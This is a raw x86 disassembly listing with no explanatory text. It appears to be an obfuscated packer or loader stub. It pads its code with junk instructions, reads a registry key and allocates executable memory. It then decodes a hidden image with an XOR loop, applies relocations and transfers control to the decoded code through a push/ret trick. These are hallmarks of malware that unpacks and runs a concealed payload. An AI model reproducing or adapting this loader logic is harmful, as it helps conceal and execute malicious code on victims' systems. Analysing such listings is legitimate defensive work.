  41e304:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e30b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e312:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e319:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e320:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e327:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e32e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e335:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e33c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e343:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e34a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e351:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e358:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e35f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e366:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e36d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e374:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e37b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e382:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e389:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e390:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e397:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e39e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3a5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3ac:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3b3:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3ba:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3c1:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3c8:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3cf:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3d6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3dd:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3e4:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3eb:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3f2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3f9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e400:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e407:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e40e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e415:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e41c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e423:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e42a:	mov    ecx,DWORD PTR [ebp+0x8]
  41e42d:	add    ecx,0x8
  41e430:	mov    DWORD PTR ds:0x423150,ecx
  41e436:	mov    edx,DWORD PTR [ebp+0x8]
  41e439:	mov    eax,DWORD PTR [edx+0x4]
  41e43c:	mov    ds:0x423144,eax
  41e441:	call   0x41d820
  41e446:	mov    ecx,DWORD PTR [ebp+0x8]
  41e449:	mov    DWORD PTR ds:0x423140,ecx
  41e44f:	mov    edx,DWORD PTR [ebp+0x10]
  41e452:	push   edx
  41e453:	mov    eax,DWORD PTR [ebp+0xc]
  41e456:	push   eax
  41e457:	push   0x1
  41e459:	call   0x41d6c0
  41e45e:	add    esp,0xc
  41e461:	mov    DWORD PTR [ebp+0x8],eax
  41e464:	jmp    0x41e065
  41e469:	mov    esp,ebp
  41e46b:	pop    ebp
  41e46c:	ret    
  41e46d:	int3   
  41e46e:	int3   
  41e46f:	int3   
  41e470:	push   ebp
  41e471:	mov    ebp,esp
  41e473:	sub    esp,0x7c
  41e476:	push   ebx
  41e477:	push   esi
  41e478:	push   edi
  41e479:	mov    DWORD PTR [ebp-0x28],0x41dc00
  41e480:	mov    DWORD PTR ds:0x423148,ebp
  41e486:	mov    DWORD PTR [ebp-0x2c],0x0
  41e48d:	mov    DWORD PTR [ebp-0x3c],0x80000002
  41e494:	mov    DWORD PTR [ebp-0x6c],0x422000
  41e49b:	mov    eax,ds:0x422468
  41e4a0:	mov    DWORD PTR [ebp-0x64],eax
  41e4a3:	mov    DWORD PTR [ebp-0xc],0x1471
  41e4aa:	mov    DWORD PTR [ebp-0xc],0x1471
  41e4b1:	mov    ecx,DWORD PTR ds:0x4225e0
  41e4b7:	mov    DWORD PTR [ebp-0x60],ecx
  41e4ba:	lea    edx,[ebp-0x68]
  41e4bd:	push   edx
  41e4be:	push   0x20019
  41e4c3:	push   0x0
  41e4c5:	push   0x422030
  41e4ca:	push   0x80000002
  41e4cf:	call   DWORD PTR [ebp-0x60]
  41e4d2:	test   eax,eax
  41e4d4:	jne    0x41e4e5
  41e4d6:	push   0x0
  41e4d8:	call   DWORD PTR ds:0x422450
  41e4de:	xor    eax,eax
  41e4e0:	jmp    0x41e720
  41e4e5:	lea    eax,[ebp-0x68]
  41e4e8:	push   eax
  41e4e9:	push   0x20019
  41e4ee:	push   0x0
  41e4f0:	mov    ecx,DWORD PTR [ebp-0x6c]
  41e4f3:	push   ecx
  41e4f4:	push   0x80000002
  41e4f9:	call   DWORD PTR [ebp-0x60]
  41e4fc:	test   eax,eax
  41e4fe:	je     0x41e50f
  41e500:	push   0x0
  41e502:	call   DWORD PTR ds:0x422450
  41e508:	xor    eax,eax
  41e50a:	jmp    0x41e720
  41e50f:	call   0x41dc40
  41e514:	mov    edx,DWORD PTR ds:0x423134
  41e51a:	push   edx
  41e51b:	call   0x41d610
  41e520:	add    esp,0x4
  41e523:	mov    ds:0x42312c,eax
  41e528:	mov    eax,ds:0x42312c
  41e52d:	push   eax
  41e52e:	call   0x41e860
  41e533:	add    esp,0x4
  41e536:	mov    ds:0x423154,eax
  41e53b:	mov    ecx,DWORD PTR ds:0x42312c
  41e541:	mov    DWORD PTR [ebp-0x34],ecx
  41e544:	mov    DWORD PTR [ebp-0x24],0x64
  41e54b:	mov    DWORD PTR [ebp-0x14],0x14
  41e552:	mov    DWORD PTR [ebp-0x2c],0x0
  41e559:	mov    DWORD PTR [ebp-0x18],0x0
  41e560:	mov    DWORD PTR [ebp-0x20],0x1
  41e567:	mov    DWORD PTR [ebp-0xc],0x0
  41e56e:	mov    edx,DWORD PTR [ebp-0x2c]
  41e571:	cmp    edx,DWORD PTR ds:0x42312c
  41e577:	jae    0x41e5cb
  41e579:	mov    eax,DWORD PTR [ebp-0x34]
  41e57c:	push   eax
  41e57d:	mov    ecx,DWORD PTR [ebp-0x24]
  41e580:	push   ecx
  41e581:	call   0x41d680
  41e586:	add    esp,0x8
  41e589:	mov    DWORD PTR [ebp-0x38],eax
  41e58c:	mov    edx,DWORD PTR [ebp-0x38]
  41e58f:	push   edx
  41e590:	mov    eax,ds:0x423134
  41e595:	add    eax,DWORD PTR [ebp-0x18]
  41e598:	push   eax
  41e599:	mov    ecx,DWORD PTR ds:0x423154
  41e59f:	add    ecx,DWORD PTR [ebp-0x2c]
  41e5a2:	push   ecx
  41e5a3:	call   0x41ea40
  41e5a8:	add    esp,0xc
  41e5ab:	mov    edx,DWORD PTR [ebp-0x14]
  41e5ae:	add    edx,DWORD PTR [ebp-0x24]
  41e5b1:	add    edx,DWORD PTR [ebp-0x18]
  41e5b4:	mov    DWORD PTR [ebp-0x18],edx
  41e5b7:	mov    eax,DWORD PTR [ebp-0x2c]
  41e5ba:	add    eax,DWORD PTR [ebp-0x24]
  41e5bd:	mov    DWORD PTR [ebp-0x2c],eax
  41e5c0:	mov    ecx,DWORD PTR [ebp-0x34]
  41e5c3:	sub    ecx,DWORD PTR [ebp-0x38]
  41e5c6:	mov    DWORD PTR [ebp-0x34],ecx
  41e5c9:	jmp    0x41e56e
  41e5cb:	mov    edx,DWORD PTR ds:0x42312c
  41e5d1:	push   edx
  41e5d2:	mov    eax,ds:0x423154
  41e5d7:	push   eax
  41e5d8:	call   0x41e730
  41e5dd:	add    esp,0x8
  41e5e0:	pusha  
  41e5e1:	mov    DWORD PTR [ebp-0x18],0x0
  41e5e8:	mov    DWORD PTR [ebp-0x70],0x0
  41e5ef:	mov    ecx,DWORD PTR ds:0x42312c
  41e5f5:	push   ecx
  41e5f6:	push   0x0
  41e5f8:	mov    edx,DWORD PTR ds:0x423130
  41e5fe:	push   edx
  41e5ff:	call   0x41d5c0
  41e604:	add    esp,0xc
  41e607:	mov    eax,ds:0x42312c
  41e60c:	mov    DWORD PTR [ebp-0x78],eax
  41e60f:	mov    ecx,DWORD PTR [ebp-0x70]
  41e612:	cmp    ecx,DWORD PTR ds:0x42312c
  41e618:	jae    0x41e66c
  41e61a:	mov    edx,DWORD PTR [ebp-0x78]
  41e61d:	push   edx
  41e61e:	mov    eax,DWORD PTR [ebp-0x24]
  41e621:	push   eax
  41e622:	call   0x41d680
  41e627:	add    esp,0x8
  41e62a:	mov    DWORD PTR [ebp-0x7c],eax
  41e62d:	mov    ecx,DWORD PTR [ebp-0x7c]
  41e630:	push   ecx
  41e631:	mov    edx,DWORD PTR ds:0x423134
  41e637:	add    edx,DWORD PTR [ebp-0x18]
  41e63a:	push   edx
  41e63b:	mov    eax,ds:0x423130
  41e640:	add    eax,DWORD PTR [ebp-0x70]
  41e643:	push   eax
  41e644:	call   0x41ea40
  41e649:	add    esp,0xc
  41e64c:	mov    ecx,DWORD PTR [ebp-0x14]
  41e64f:	add    ecx,DWORD PTR [ebp-0x24]
  41e652:	add    ecx,DWORD PTR [ebp-0x18]
  41e655:	mov    DWORD PTR [ebp-0x18],ecx
  41e658:	mov    edx,DWORD PTR [ebp-0x70]
  41e65b:	add    edx,DWORD PTR [ebp-0x24]
  41e65e:	mov    DWORD PTR [ebp-0x70],edx
  41e661:	mov    eax,DWORD PTR [ebp-0x78]
  41e664:	sub    eax,DWORD PTR [ebp-0x7c]
  41e667:	mov    DWORD PTR [ebp-0x78],eax
  41e66a:	jmp    0x41e60f
  41e66c:	mov    ecx,DWORD PTR ds:0x42312c
  41e672:	push   ecx
  41e673:	mov    edx,DWORD PTR ds:0x423130
  41e679:	push   edx
  41e67a:	call   0x41e730
  41e67f:	add    esp,0x8
  41e682:	mov    DWORD PTR [ebp-0x28],0x41dc00
  41e689:	mov    eax,ds:0x423154
  41e68e:	mov    ecx,DWORD PTR ds:0x423130
  41e694:	mov    DWORD PTR [eax],ecx
  41e696:	push   0x19000
  41e69b:	call   0x41e860
  41e6a0:	add    esp,0x4
  41e6a3:	mov    ds:0x423158,eax
  41e6a8:	mov    edx,DWORD PTR ds:0x423158
  41e6ae:	add    edx,0x200
  41e6b4:	mov    DWORD PTR ds:0x42315c,edx
  41e6ba:	push   0x17600
  41e6bf:	mov    eax,ds:0x423154
  41e6c4:	push   eax
  41e6c5:	mov    ecx,DWORD PTR ds:0x42315c
  41e6cb:	push   ecx
  41e6cc:	call   0x41ea40
  41e6d1:	add    esp,0xc
  41e6d4:	mov    edx,DWORD PTR ds:0x423158
  41e6da:	add    edx,0x174c0
  41e6e0:	mov    DWORD PTR ds:0x42314c,edx
  41e6e6:	mov    ecx,ecx
  41e6e8:	mov    ecx,ecx
  41e6ea:	mov    ecx,ecx
  41e6ec:	popa   
  41e6ed:	mov    ecx,ecx
  41e6ef:	mov    ecx,ecx
  41e6f1:	mov    ecx,ecx
  41e6f3:	mov    ecx,ecx
  41e6f5:	push   0xde9b
  41e6fa:	mov    eax,DWORD PTR [ebp-0x28]
  41e6fd:	mov    ecx,ecx
  41e6ff:	mov    ecx,ecx
  41e701:	mov    ecx,esp
  41e703:	push   edx
  41e704:	mov    edx,ecx
  41e706:	sub    edx,0x26
  41e709:	mov    ecx,edx
  41e70b:	pop    edx
  41e70c:	add    ecx,0x22
  41e70f:	mov    ecx,ecx
  41e711:	mov    DWORD PTR [ecx+0x4],0x0
  41e718:	mov    ecx,ecx
  41e71a:	add    DWORD PTR [ecx+0x4],eax
  41e71d:	ret    
  41e71e:	xor    eax,eax
  41e720:	pop    edi
  41e721:	pop    esi
  41e722:	pop    ebx
  41e723:	mov    esp,ebp
  41e725:	pop    ebp
  41e726:	ret    
  41e727:	int3   
  41e728:	int3   
  41e729:	int3   
  41e72a:	int3   
  41e72b:	int3   
  41e72c:	int3   
  41e72d:	int3   
  41e72e:	int3   
  41e72f:	int3   
  41e730:	push   ebp
  41e731:	mov    ebp,esp
  41e733:	sub    esp,0x10
  41e736:	mov    DWORD PTR [ebp-0x4],0x0
  41e73d:	jmp    0x41e748
  41e73f:	mov    eax,DWORD PTR [ebp-0x4]
  41e742:	add    eax,0x4
  41e745:	mov    DWORD PTR [ebp-0x4],eax
  41e748:	mov    ecx,DWORD PTR [ebp-0x4]
  41e74b:	cmp    ecx,DWORD PTR [ebp+0xc]
  41e74e:	jae    0x41e7eb
  41e754:	mov    DWORD PTR [ebp-0x8],0xc842
  41e75b:	mov    DWORD PTR [ebp-0x8],0xc842
  41e762:	mov    DWORD PTR [ebp-0x8],0xc842
  41e769:	mov    edx,DWORD PTR [ebp-0x4]
  41e76c:	add    edx,0x8948c
  41e772:	mov    DWORD PTR ds:0x423160,edx
  41e778:	mov    DWORD PTR [ebp-0x8],0xc842
  41e77f:	mov    eax,DWORD PTR [ebp+0x8]
  41e782:	add    eax,DWORD PTR [ebp-0x4]
  41e785:	mov    DWORD PTR [ebp-0x10],eax
  41e788:	mov    DWORD PTR [ebp-0x8],0xc842
  41e78f:	mov    DWORD PTR [ebp-0x8],0xc842
  41e796:	mov    DWORD PTR [ebp-0x8],0xc842
  41e79d:	mov    ecx,DWORD PTR [ebp-0x10]
  41e7a0:	mov    DWORD PTR [ebp-0xc],ecx
  41e7a3:	mov    edx,DWORD PTR ds:0x423160
  41e7a9:	mov    DWORD PTR [ebp-0x8],edx
  41e7ac:	mov    DWORD PTR [ebp-0x8],0xc842
  41e7b3:	mov    eax,DWORD PTR [ebp-0x10]
  41e7b6:	mov    ecx,DWORD PTR [eax]
  41e7b8:	add    ecx,DWORD PTR [ebp-0x4]
  41e7bb:	mov    edx,DWORD PTR [ebp-0x10]
  41e7be:	mov    DWORD PTR [edx],ecx
  41e7c0:	mov    eax,DWORD PTR [ebp-0xc]
  41e7c3:	mov    ecx,DWORD PTR [eax]
  41e7c5:	mov    DWORD PTR [ebp-0x8],ecx
  41e7c8:	mov    edx,DWORD PTR ds:0x423160
  41e7ce:	push   edx
  41e7cf:	mov    eax,DWORD PTR [ebp-0x8]
  41e7d2:	push   eax
  41e7d3:	call   0x41e7f0
  41e7d8:	add    esp,0x8
  41e7db:	mov    DWORD PTR [ebp-0x8],eax
  41e7de:	mov    ecx,DWORD PTR [ebp-0xc]
  41e7e1:	mov    edx,DWORD PTR [ebp-0x8]
  41e7e4:	mov    DWORD PTR [ecx],edx
  41e7e6:	jmp    0x41e73f
  41e7eb:	mov    esp,ebp
  41e7ed:	pop    ebp
  41e7ee:	ret    
  41e7ef:	int3   
  41e7f0:	push   ebp
  41e7f1:	mov    ebp,esp
  41e7f3:	sub    esp,0x14
  41e7f6:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e7fd:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e804:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e80b:	mov    eax,DWORD PTR [ebp+0x8]
  41e80e:	xor    eax,DWORD PTR [ebp+0xc]
  41e811:	mov    DWORD PTR [ebp-0x10],eax
  41e814:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e81b:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e822:	mov    ecx,DWORD PTR [ebp+0xc]
  41e825:	mov    DWORD PTR [ebp-0x4],ecx
  41e828:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e82f:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e836:	mov    edx,DWORD PTR [ebp+0x8]
  41e839:	mov    DWORD PTR [ebp-0xc],edx
  41e83c:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e843:	mov    DWORD PTR [ebp-0x8],0xdd7
  41e84a:	mov    eax,DWORD PTR [ebp-0x10]
  41e84d:	mov    DWORD PTR [ebp-0x14],eax
  41e850:	mov    eax,DWORD PTR [ebp-0x14]
  41e853:	mov    esp,ebp
  41e855:	pop    ebp
  41e856:	ret    
  41e857:	int3   
  41e858:	int3   
  41e859:	int3   
  41e85a:	int3   
  41e85b:	int3   
  41e85c:	int3   
  41e85d:	int3   
  41e85e:	int3   
  41e85f:	int3   
  41e860:	push   ebp
  41e861:	mov    ebp,esp
  41e863:	sub    esp,0x238
  41e869:	mov    DWORD PTR [ebp-0x1c],0x307c
  41e870:	mov    DWORD PTR [ebp-0x238],0x3000
  41e87a:	mov    DWORD PTR [ebp-0x18],0x40
  41e881:	mov    DWORD PTR [ebp-0x22c],0x0
  41e88b:	mov    DWORD PTR [ebp-0x230],0x0
  41e895:	mov    DWORD PTR [ebp-0x14],0x0
  41e89c:	lea    eax,[ebp-0x14]
  41e89f:	push   eax
  41e8a0:	push   0x0
  41e8a2:	call   DWORD PTR ds:0x422464
  41e8a8:	cmp    DWORD PTR [ebp-0x14],0x0
  41e8ac:	jne    0x41e8b2
  41e8ae:	xor    eax,eax
  41e8b0:	jmp    0x41e8ce
  41e8b2:	mov    ecx,DWORD PTR [ebp-0x18]
  41e8b5:	push   ecx
  41e8b6:	mov    edx,DWORD PTR [ebp-0x238]
  41e8bc:	push   edx
  41e8bd:	mov    eax,DWORD PTR [ebp+0x8]
  41e8c0:	push   eax
  41e8c1:	mov    ecx,DWORD PTR [ebp-0x22c]
  41e8c7:	push   ecx
  41e8c8:	call   DWORD PTR ds:0x42246c
  41e8ce:	mov    esp,ebp
  41e8d0:	pop    ebp
  41e8d1:	ret    
  41e8d2:	int3   
  41e8d3:	int3   
  41e8d4:	int3   
  41e8d5:	int3   
  41e8d6:	int3   
  41e8d7:	int3   
  41e8d8:	int3   
  41e8d9:	int3   
  41e8da:	int3   
  41e8db:	int3   
  41e8dc:	int3   
  41e8dd:	int3   
  41e8de:	int3   
  41e8df:	int3   
  41e8e0:	push   ebp
  41e8e1:	mov    ebp,esp
  41e8e3:	sub    esp,0xc
  41e8e6:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e8ed:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e8f4:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e8fb:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e902:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e909:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e910:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e917:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e91e:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e925:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e92c:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e933:	mov    DWORD PTR [ebp-0x4],0x0
  41e93a:	jmp    0x41e945
  41e93c:	mov    eax,DWORD PTR [ebp-0x4]
  41e93f:	add    eax,0x1
  41e942:	mov    DWORD PTR [ebp-0x4],eax
  41e945:	mov    ecx,DWORD PTR [ebp-0x4]
  41e948:	cmp    ecx,DWORD PTR ds:0x423144
  41e94e:	jae    0x41ea3c
  41e954:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e95b:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e962:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e969:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e970:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e977:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e97e:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e985:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e98c:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e993:	mov    edx,DWORD PTR [ebp-0x4]
  41e996:	push   edx
  41e997:	mov    eax,ds:0x423150
  41e99c:	push   eax
  41e99d:	call   0x41d620
  41e9a2:	add    esp,0x8
  41e9a5:	sar    eax,0xc
  41e9a8:	cmp    eax,0x3
  41e9ab:	jne    0x41ea37
  41e9b1:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9b8:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9bf:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9c6:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9cd:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9d4:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9db:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9e2:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9e9:	mov    DWORD PTR [ebp-0xc],0x889bb
  41e9f0:	mov    ecx,DWORD PTR [ebp-0x4]
  41e9f3:	push   ecx
  41e9f4:	mov    edx,DWORD PTR ds:0x423150
  41e9fa:	push   edx
  41e9fb:	call   0x41d620
  41ea00:	add    esp,0x8
  41ea03:	and    eax,0xfff
  41ea08:	add    eax,0xa124
  41ea0d:	mov    DWORD PTR [ebp-0x8],eax
  41ea10:	mov    eax,DWORD PTR [ebp+0x8]
  41ea13:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea16:	add    ecx,DWORD PTR [eax]
  41ea18:	mov    edx,DWORD PTR [ebp-0x8]
  41ea1b:	mov    eax,DWORD PTR [ecx+edx*1-0xa124]
  41ea22:	add    eax,DWORD PTR [ebp+0x10]
  41ea25:	mov    ecx,DWORD PTR [ebp+0x8]
  41ea28:	mov    edx,DWORD PTR [ebp+0xc]
  41ea2b:	add    edx,DWORD PTR [ecx]
  41ea2d:	mov    ecx,DWORD PTR [ebp-0x8]
  41ea30:	mov    DWORD PTR [edx+ecx*1-0xa124],eax
  41ea37:	jmp    0x41e93c
  41ea3c:	mov    esp,ebp
  41ea3e:	pop    ebp
  41ea3f:	ret    
  41ea40:	push   ebp
  41ea41:	mov    ebp,esp
  41ea43:	sub    esp,0x8
  41ea46:	mov    DWORD PTR [ebp-0x4],0x0
  41ea4d:	jmp    0x41ea58
  41ea4f:	mov    eax,DWORD PTR [ebp-0x4]
  41ea52:	add    eax,0x1
  41ea55:	mov    DWORD PTR [ebp-0x4],eax
  41ea58:	mov    ecx,DWORD PTR [ebp-0x4]
  41ea5b:	cmp    ecx,DWORD PTR [ebp+0x10]
  41ea5e:	jge    0x41eabf
  41ea60:	mov    DWORD PTR [ebp-0x8],0x889bb
  41ea67:	mov    DWORD PTR [ebp-0x8],0x889bb
  41ea6e:	mov    DWORD PTR [ebp-0x8],0x889bb
  41ea75:	mov    DWORD PTR [ebp-0x8],0x889bb
  41ea7c:	mov    DWORD PTR [ebp-0x8],0x889bb
  41ea83:	mov    DWORD PTR [ebp-0x8],0x889bb
  41ea8a:	mov    DWORD PTR [ebp-0x8],0x889bb
  41ea91:	mov    DWORD PTR [ebp-0x8],0x889bb
  41ea98:	mov    DWORD PTR [ebp-0x8],0x889bb
  41ea9f:	mov    DWORD PTR [ebp-0x8],0x889bb
  41eaa6:	mov    DWORD PTR [ebp-0x8],0x889bb
  41eaad:	mov    edx,DWORD PTR [ebp+0x8]
  41eab0:	add    edx,DWORD PTR [ebp-0x4]
  41eab3:	mov    eax,DWORD PTR [ebp+0xc]
  41eab6:	add    eax,DWORD PTR [ebp-0x4]
  41eab9:	mov    cl,BYTE PTR [eax]
  41eabb:	mov    BYTE PTR [edx],cl
  41eabd:	jmp    0x41ea4f
  41eabf:	mov    edx,DWORD PTR [ebp+0x8]
  41eac2:	cmp    edx,DWORD PTR ds:0x42315c
  41eac8:	jne    0x41eaeb
  41eaca:	mov    eax,ds:0x423158
  41eacf:	sub    eax,0x400000
  41ead4:	push   eax
  41ead5:	mov    ecx,DWORD PTR ds:0x423158
  41eadb:	push   ecx
  41eadc:	mov    edx,DWORD PTR ds:0x423130
  41eae2:	push   edx
  41eae3:	call   0x41dca0
  41eae8:	add    esp,0xc
  41eaeb:	mov    esp,ebp
  41eaed:	pop    ebp
  41eaee:	ret    
  41eaef:	jmp    DWORD PTR ds:0x422374
  41eaf5:	jmp    DWORD PTR ds:0x422378
  41eafb:	jmp    DWORD PTR ds:0x42237c
  41eb01:	jmp    DWORD PTR ds:0x422380
  41eb07:	jmp    DWORD PTR ds:0x422384
  41eb0d:	jmp    DWORD PTR ds:0x422388
  41eb13:	jmp    DWORD PTR ds:0x42238c
  41eb19:	jmp    DWORD PTR ds:0x422390
  41eb1f:	jmp    DWORD PTR ds:0x422394
  41eb25:	jmp    DWORD PTR ds:0x422398
  41eb2b:	jmp    DWORD PTR ds:0x42239c
  41eb31:	jmp    DWORD PTR ds:0x4223a0
  41eb37:	jmp    DWORD PTR ds:0x4223a4
  41eb3d:	jmp    DWORD PTR ds:0x4223a8
  41eb43:	jmp    DWORD PTR ds:0x4223ac
  41eb49:	jmp    DWORD PTR ds:0x4223b0
  41eb4f:	jmp    DWORD PTR ds:0x4223b4
  41eb55:	jmp    DWORD PTR ds:0x4223b8
  41eb5b:	jmp    DWORD PTR ds:0x4223bc
  41eb61:	jmp    DWORD PTR ds:0x4223c0
  41eb67:	jmp    DWORD PTR ds:0x4223c4
  41eb6d:	jmp    DWORD PTR ds:0x4223c8
  41eb73:	jmp    DWORD PTR ds:0x4223cc
  41eb79:	jmp    DWORD PTR ds:0x4223d0
  41eb7f:	jmp    DWORD PTR ds:0x4223d4
  41eb85:	jmp    DWORD PTR ds:0x4223d8
  41eb8b:	jmp    DWORD PTR ds:0x4223dc
  41eb91:	jmp    DWORD PTR ds:0x4223e0
  41eb97:	jmp    DWORD PTR ds:0x4223e4
  41eb9d:	jmp    DWORD PTR ds:0x4223e8
  41eba3:	jmp    DWORD PTR ds:0x4223ec
  41eba9:	jmp    DWORD PTR ds:0x4223f0
  41ebaf:	jmp    DWORD PTR ds:0x4223f4
  41ebb5:	jmp    DWORD PTR ds:0x4223f8
  41ebbb:	jmp    DWORD PTR ds:0x4223fc
  41ebc1:	jmp    DWORD PTR ds:0x422400
  41ebc7:	jmp    DWORD PTR ds:0x422404
  41ebcd:	jmp    DWORD PTR ds:0x422408
  41ebd3:	jmp    DWORD PTR ds:0x42240c
  41ebd9:	jmp    DWORD PTR ds:0x422410
  41ebdf:	jmp    DWORD PTR ds:0x422414
  41ebe5:	jmp    DWORD PTR ds:0x422418
  41ebeb:	jmp    DWORD PTR ds:0x42241c
  41ebf1:	jmp    DWORD PTR ds:0x422420
  41ebf7:	jmp    DWORD PTR ds:0x422424
  41ebfd:	jmp    DWORD PTR ds:0x422428
  41ec03:	jmp    DWORD PTR ds:0x42242c
  41ec09:	jmp    DWORD PTR ds:0x422430
  41ec0f:	jmp    DWORD PTR ds:0x422434
  41ec15:	jmp    DWORD PTR ds:0x422438
  41ec1b:	jmp    DWORD PTR ds:0x42243c
  41ec21:	jmp    DWORD PTR ds:0x422440
  41ec27:	jmp    DWORD PTR ds:0x422444
  41ec2d:	jmp    DWORD PTR ds:0x422448
  41ec33:	jmp    DWORD PTR ds:0x42244c
  41ec39:	jmp    DWORD PTR ds:0x422450
  41ec3f:	jmp    DWORD PTR ds:0x422454
  41ec45:	jmp    DWORD PTR ds:0x422458
  41ec4b:	jmp    DWORD PTR ds:0x42245c
  41ec51:	jmp    DWORD PTR ds:0x422460
  41ec57:	jmp    DWORD PTR ds:0x422464
  41ec5d:	jmp    DWORD PTR ds:0x422468
  41ec63:	jmp    DWORD PTR ds:0x42246c
  41ec69:	jmp    DWORD PTR ds:0x422474
  41ec6f:	jmp    DWORD PTR ds:0x422478
  41ec75:	jmp    DWORD PTR ds:0x42247c
  41ec7b:	jmp    DWORD PTR ds:0x422480
  41ec81:	jmp    DWORD PTR ds:0x422484
  41ec87:	jmp    DWORD PTR ds:0x422488
  41ec8d:	jmp    DWORD PTR ds:0x42248c
  41ec93:	jmp    DWORD PTR ds:0x422490
  41ec99:	jmp    DWORD PTR ds:0x422494
  41ec9f:	jmp    DWORD PTR ds:0x422498
  41eca5:	jmp    DWORD PTR ds:0x42249c
  41ecab:	jmp    DWORD PTR ds:0x4224a0
  41ecb1:	jmp    DWORD PTR ds:0x4224a4
  41ecb7:	jmp    DWORD PTR ds:0x4224a8
  41ecbd:	jmp    DWORD PTR ds:0x4224ac
  41ecc3:	jmp    DWORD PTR ds:0x4224b0
  41ecc9:	jmp    DWORD PTR ds:0x4224b4
  41eccf:	jmp    DWORD PTR ds:0x4224b8
  41ecd5:	jmp    DWORD PTR ds:0x4224bc
  41ecdb:	jmp    DWORD PTR ds:0x4224c0
  41ece1:	jmp    DWORD PTR ds:0x4224c4
  41ece7:	jmp    DWORD PTR ds:0x4224c8
  41eced:	jmp    DWORD PTR ds:0x4224cc
  41ecf3:	jmp    DWORD PTR ds:0x4224d0
  41ecf9:	jmp    DWORD PTR ds:0x4224d4
  41ecff:	jmp    DWORD PTR ds:0x4224d8
  41ed05:	jmp    DWORD PTR ds:0x4224dc
  41ed0b:	jmp    DWORD PTR ds:0x4224e0
  41ed11:	jmp    DWORD PTR ds:0x4224e4
  41ed17:	jmp    DWORD PTR ds:0x4224e8
  41ed1d:	jmp    DWORD PTR ds:0x4224ec
  41ed23:	jmp    DWORD PTR ds:0x4224f0
  41ed29:	jmp    DWORD PTR ds:0x4224f4
  41ed2f:	jmp    DWORD PTR ds:0x4224f8
  41ed35:	jmp    DWORD PTR ds:0x4224fc
  41ed3b:	jmp    DWORD PTR ds:0x422500
  41ed41:	jmp    DWORD PTR ds:0x422504
  41ed47:	jmp    DWORD PTR ds:0x422508
  41ed4d:	jmp    DWORD PTR ds:0x42250c
  41ed53:	jmp    DWORD PTR ds:0x422510
  41ed59:	jmp    DWORD PTR ds:0x422514
  41ed5f:	jmp    DWORD PTR ds:0x422518
  41ed65:	jmp    DWORD PTR ds:0x42251c
  41ed6b:	jmp    DWORD PTR ds:0x422520
